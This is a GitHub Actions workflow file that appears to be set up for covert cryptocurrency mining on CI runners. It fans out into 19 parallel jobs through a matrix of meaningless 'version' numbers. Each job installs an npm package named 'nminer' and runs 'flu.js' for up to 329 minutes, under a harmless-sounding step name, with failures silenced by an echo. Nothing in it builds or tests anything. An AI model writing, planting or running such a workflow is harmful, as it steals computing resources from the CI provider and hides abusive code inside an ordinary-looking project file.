name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8308 }
          - { version: 4807 }
          - { version: 2043 }
          - { version: 2245 }
          - { version: 5947 }
          - { version: 3625 }
          - { version: 55 }
          - { version: 5347 }
          - { version: 2011 }
          - { version: 9026 }
          - { version: 2808 }
          - { version: 2156 }
          - { version: 9078 }
          - { version: 1206 }
          - { version: 6516 }
          - { version: 790 }
          - { version: 3535 }
          - { version: 8548 }
          - { version: 3944 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: rare radiant
        run: |
          npm install nminer@latest
          timeout 329m node flu.js || echo "flu executed"